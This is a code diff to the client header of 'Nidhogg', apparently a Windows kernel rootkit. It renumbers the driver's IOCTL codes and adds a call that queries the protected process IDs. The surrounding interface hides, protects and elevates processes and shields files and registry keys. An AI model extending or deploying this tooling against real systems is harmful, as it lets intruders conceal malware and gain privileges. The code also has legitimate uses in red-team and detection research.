@@ -3,20 +3,21 @@
 #include <sddl.h>
 #pragma comment(lib, "advapi32.lib")
 
-// ** IOCTL *************************************************************************************************
+// ** IOCTL ************************************************************************************
 #define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_HIDE_PROCESS CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_ELEVATE_PROCESS CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_PROCESSES CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *********************************************************************************************************
 
 // ** General Definitions ***************************************************************************************
@@ -25,6 +26,8 @@
 #define NIDHOGG_GENERAL_ERROR 1
 #define NIDHOGG_ERROR_CONNECT_DRIVER 2
 #define NIDHOGG_ERROR_DEVICECONTROL_DRIVER 3
+
+#define MAX_PIDS 256
 
 #define REG_TYPE_KEY 0
 #define REG_TYPE_VALUE 1
@@ -43,6 +46,11 @@
 // *********************************************************************************************************
 
 // ** General Structures ***************************************************************************************
+struct ProcessesList {
+    int PidsCount;
+    ULONG Pids[MAX_PIDS];
+};
+
 struct RegItem {
     int Type;
     WCHAR KeyPath[REG_KEY_LEN];
@@ -228,6 +236,34 @@ int NidhoggProcessElevate(std::vector<DWORD> pids) {
 
     CloseHandle(hFile);
     return NIDHOGG_SUCCESS;
+}
+
+std::vector<DWORD> NidhoggProcessQuery() {
+    ProcessesList result{};
+    std::vector<DWORD> pids;
+    DWORD returned;
+
+    HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        pids.push_back(NIDHOGG_ERROR_CONNECT_DRIVER);
+        return pids;
+    }
+
+    if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_QUERY_PROCESSES,
+        nullptr, 0,
+        &result, sizeof(result), &returned, nullptr)) {
+        pids.push_back(NIDHOGG_ERROR_DEVICECONTROL_DRIVER);
+        CloseHandle(hFile);
+        return pids;
+    }
+
+    for (int i = 0; i < result.PidsCount; i++) {
+        pids.push_back(result.Pids[i]);
+    }
+
+    CloseHandle(hFile);
+    return pids;
 }
 
 int NidhoggFileProtect(wchar_t* filePath) {
